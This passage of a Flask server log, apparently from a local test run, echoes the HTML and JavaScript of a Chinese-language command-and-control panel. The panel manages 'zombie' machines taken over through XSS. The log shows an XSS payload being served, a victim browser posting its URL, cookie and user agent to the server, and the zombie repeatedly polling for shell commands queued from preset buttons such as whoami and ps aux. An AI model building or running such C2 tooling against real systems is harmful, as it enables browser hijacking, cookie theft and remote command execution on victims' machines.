</div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:16:45.339064</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:48] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:48] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:48] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:16:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:16:48 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:16:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0011s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:16:45.339064</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:48] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:48] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:16:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:16:48] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:19:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:19:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:19:27 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:19:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:27] "[33mGET /add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 404 -
2025-06-24 23:19:27 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:19:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:19:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:27] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:19:27 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:19:27.946231', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:19:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0024s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:19:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:27] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:19:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:19:27 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:19:27 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:19:27.951Z"},時間: 2025-06-24 23:19:27.957703
2025-06-24 23:19:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0036s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:19:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:27] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:19:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:19:39 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:19:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:16:45.339064</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:19:27.951Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:19:27.955085</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        